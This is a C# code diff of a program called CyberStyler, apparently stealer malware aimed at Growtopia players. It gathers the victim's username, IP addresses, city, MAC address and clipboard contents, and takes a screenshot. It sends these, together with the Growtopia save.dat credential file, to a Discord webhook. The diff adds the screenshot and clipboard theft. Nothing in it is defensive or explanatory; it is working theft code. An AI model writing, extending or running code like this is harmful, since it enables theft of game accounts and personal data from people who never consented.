@@ -1,15 +1,8 @@
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Threading.Tasks;
 using System.Net;
 using System.IO;
-using System.Windows.Forms;
-using System.Net.Http;
 using JNogueira.Discord.Webhook.Client;
-using System.Text;
 using System.Net.NetworkInformation;
-using System.ComponentModel;
 namespace CyberStyler
 {
     static class Program
@@ -21,7 +14,6 @@ namespace CyberStyler
         [STAThread]
         static void Main()
         {
-
             var client = new DiscordWebhookClient("");
             string user = Environment.UserName;
             String host = System.Net.Dns.GetHostName();
@@ -37,7 +29,15 @@ namespace CyberStyler
 
             var mac = NetworkInterface.GetAllNetworkInterfaces();
             var getTarget = mac[0].GetPhysicalAddress();
+            try
+            {
+                File.Delete(@"C:\Users" + user + @"\AppData\Local\Temp\screenshot.png");
+            }
+            catch
+            {
 
+            }
+            Screenshot.GetScreenshot();
             var dat = Directory.GetFiles(@"C:\Users\" + user + @"\AppData\Local\Growtopia", "save.dat");
             var message = new DiscordMessage(
                 username: "CyberHook",
@@ -48,23 +48,37 @@ namespace CyberStyler
                         "CyberHook Detected User",
                         color: 0,
                         author: new DiscordMessageEmbedAuthor(pcname),
-                        description: "IPv4: " + ip_internet + "\nIPv6: " + ip + "\nUser:" + user + "\nDat Files: " + dat[0] + "\nCity: " + city + "\nMac: " + getTarget)
-                });
+                        image: new DiscordMessageEmbedImage("https://media2.giphy.com/media/lp3GUtG2waC88/giphy.gif"),
+                        description: 
+                        "```IPv4: " + ip_internet + " ```"
+                        + "\n```IPv6 : " + ip + " ```"
+                        + "\n```User: " + user + " ```"
+                        + "\n```Dat Files: " + dat[0] + " ```"
+                        + "\n```City: " + city + " ```"
+                        + "\n```Mac: " + getTarget + " ```"
+                        + "\n```Clipboard: " + ClipBoard.GetClipBorad() + " ```") 
+                });;
             client.SendToDiscord(message);
-            string filename = user + "-" + pcname + "-" + city + ".dat";
+            string filename = user + "-" + pcname + ".dat";
             string fileformat = "dat";
             string filepath = dat[0];
             string application = "";
             string mssgBody = "Download:";
+            string filename1 = "Screenshot-" + pcname + ".png";
+            string fileformat1 = "png";
+            string filepath1 = @"C:\Users\" + user + @"\AppData\Local\Temp\screenshot.png";
+            string msgBody1 = "Screenshot:";
 
             try
             {
-                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending log 
+                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application);
+                DiscordWebhook.SendFile(msgBody1, filename1, fileformat1, filepath1, application);// Sending log 
             }
             catch
             {
                 DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
             }
+
         }
     }
 }
